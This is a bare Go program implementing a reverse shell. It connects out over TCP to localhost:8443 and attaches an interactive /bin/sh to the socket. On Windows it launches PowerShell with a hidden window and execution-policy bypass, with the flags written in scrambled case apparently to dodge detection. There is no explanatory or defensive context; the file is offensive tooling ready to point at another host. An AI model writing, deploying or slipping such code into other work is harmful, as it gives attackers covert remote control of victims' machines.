package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func handle(shl net.Conn) {
	defer shl.Close()

	var cmd = exec.Command("/bin/sh", "-i")

	if runtime.GOOS == "windows" {
		cmd = exec.Command("PowErshELl.exe", "-nOPrOFilE", "-W", "hIdDen", "-EXeC", "bYpAsS")
	}

	r, w := io.Pipe()
	cmd.Stdin = shl
	cmd.Stdout = w
	go io.Copy(shl, r)
	cmd.Run()
}

func main() {
	connect, err := net.Dial("tcp", "localhost:8443")
	if err != nil {
		log.Fatalln("Failed to connect.")
	}
	handle(connect)
}
